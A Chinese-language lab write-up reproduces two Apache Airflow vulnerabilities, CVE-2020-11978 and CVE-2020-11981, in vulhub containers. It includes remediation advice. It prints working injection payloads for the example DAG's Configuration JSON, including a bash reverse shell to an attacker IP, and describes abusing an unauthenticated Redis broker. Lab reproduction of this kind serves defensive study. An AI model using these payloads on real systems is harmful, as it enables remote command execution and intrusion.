  Airflow 是一个使用 python 语言编写的 data pipeline 调度和监控工作流的平台。Airflow 是通过 DAG（Directed acyclic graph 有向无环图）来管理任务流程的任务调度工具， 不需要知道业务数据的具体内容，设置任务的依赖关系即可实现任务调度。  这个平台拥有和 Hive、Presto、MySQL、HDFS、Postgres 等数据源之间交互的能力，并且提供了钩子（hook）使其拥有很好地扩展性。除了一个命令行界面，该工具还提供了一个基于 Web 的用户界面可以可视化管道的依赖关系、监控进度、触发任务等。0x01 Apache Airflow 示例dag中的命令注入（CVE-2020-11978）1.1 漏洞简介  Apache Airflow是一款开源的，分布式任务调度框架。在其1.10.10版本及以前的示例DAG中存在一处命令注入漏洞，未授权的访问者可以通过这个漏洞在Worker中执行任意命令。1.2 影响版本  Apache Airflow <= 1.10.101.3 漏洞复现1.3.1 靶场搭建  本次靶场使用vulhub中的docker环境，开启前先对数据库进行初始化。靶场地址为http://192.168.160.142:8080。docker-compose run airflow-init![](../Images/50e684ab189805f2ae47af3c948e2299.png)docker-compose up -d![](../Images/243163c6269b8beeeb63804b9f7e91c2.png)  访问http://192.168.160.142:8080，Apache Airflow页面正常展示，靶场搭建成功。![](../Images/25d2b163de3d41650d0185d217632ea8.png)1.3.2 漏洞复现  访问http://192.168.160.142:8080进入airflow管理端，将example\_trigger\_target\_dag前面的Off改为On。![](../Images/59df5e70616ee9c251b006b918fc777b.png)  进入example\_trigger\_target\_dag页面，点击Trigger DAG，进入到调试页面。![](../Images/612f90189cc822cd309829dfc64fb13c.png)  在Configuration JSON中输入：{"message":"'\\";touch /tmp/airflow\_dag\_success;#"}，再点击Trigger执行dag。![](../Images/d617cf90bd582876bb1139db28088701.png)  等几秒可以看到执行成功。![](../Images/f775db59794ad4ef6fe0529e7058c7bc.png)![](../Images/e556c6fc045ad6c4532834240eb4018b.png)  
  进入容器查看目录，发现成功创建/tmp/airflow\_dag\_success文件，漏洞复现成功。![](../Images/bb13d88b220e6ce969ac4700426a1806.png)1.3.3 反弹shell  攻击机192.168.160.143开启nc，监听8888端口。![](../Images/dbae7c6e8bae996db99c2443189f6307.png)  在Configuration JSON中输入：{"message":"'\\";bash -i >& /dev/tcp/192.168.160.143/4444 0>&1;#"}，再点击Trigger执行dag。![](../Images/97875f313b960f49d773e7cd49ee293b.png)  等几秒可以看到执行成功，且成功反弹shell。![](../Images/66a2a0d36af027cf89155697777c276d.png)![](../Images/bb356cc7daf3c79c49cfa0ea9804ee9e.png)1.4 修复建议  升级到1.10.10之后版本  删除或禁用默认DAG（可自行删除或在配置文件中禁用默认DAGload\_examples=False）1.5 参考链接

0x02 Apache Airflow Celery 消息中间件命令执行（CVE-2020-11981）2.1 漏洞简介  Apache Airflow是一款开源的，分布式任务调度框架。在其1.10.10版本及以前，如果攻击者控制了Celery的消息中间件（如Redis/RabbitMQ），将可以通过控制消息，在Worker进程中执行任意命令。2.2 影响版本  Apache Airflow <= 1.10.102.3 漏洞复现2.3.1 靶场搭建  本次靶场使用vulhub中的docker环境，开启前先对数据库进行初始化。靶场地址为http://192.168.160.142:8080。docker-compose run airflow-init![](../Images/4e1a8fc4422d6e8bfc3be487771f6b43.png)docker-compose up -d![](../Images/98d34308b79eb909b902b6664ca4fa2d.png)  访问http://192.168.160.142:8080，Apache Airflow页面正常展示，靶场搭建成功。![](../Images/ae20c2345240dd3a887c947af7235c09.png)2.3.2 漏洞复现  利用这个漏洞需要控制消息中间件，Vulhub环境中Redis存在未授权访问。通过未授权访问，攻击者可以下发自带的任务airflow.executors.celery\_executor.execute\_command来执行任意命令，参数为命令执行中所需要的数组。vulhub中自带利用脚本，为“touch /tmp/airflow\_celery\_success”命令。![](../Images/5acdf8a2babad8d5a3cd39a4ad7221b9.png)  使用脚本进行漏洞利用。![](../Images/65f21647744706cd34c2518a0ff2bffe.png)  查看日志，可以看到如下任务消息。docker-compose logs airflow-worker![](../Images/b2dae3a00aa17e59366fbcef79abe86e.png)  查看容器目录，/tmp/airflow\_celery\_success文件创建成功。docker-compose exec airflow-worker ls -l /tmp![](../Images/07b6e26506e314ff2dae631d3e4568ba.png)
